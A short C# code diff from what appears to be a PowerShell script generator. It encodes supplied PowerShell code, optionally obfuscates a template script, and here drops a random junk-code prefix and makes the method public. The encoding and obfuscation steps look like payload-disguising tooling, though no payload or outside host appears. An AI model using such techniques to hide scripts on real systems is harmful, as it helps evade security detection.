@@ -230,13 +230,13 @@ _SERVER
         return (head.ToString().Trim(), body.ToString().Trim());
     }
     
-    private string GeneratePowerShellScript(string powerShellCode)
+    public string GeneratePowerShellScript(string powerShellCode)
     {
         var encoded = CustomCryptor.Encode(powerShellCode);
         var script = ReadSource("dynamic").Data;
         if (IsObfuscate)
             script = new PowerShellObfuscator().Obfuscate(script);
-        var data = new PowerShellObfuscator().RandomCode() +  $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + script;
+        var data = $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + script;
         return data;
     }
 
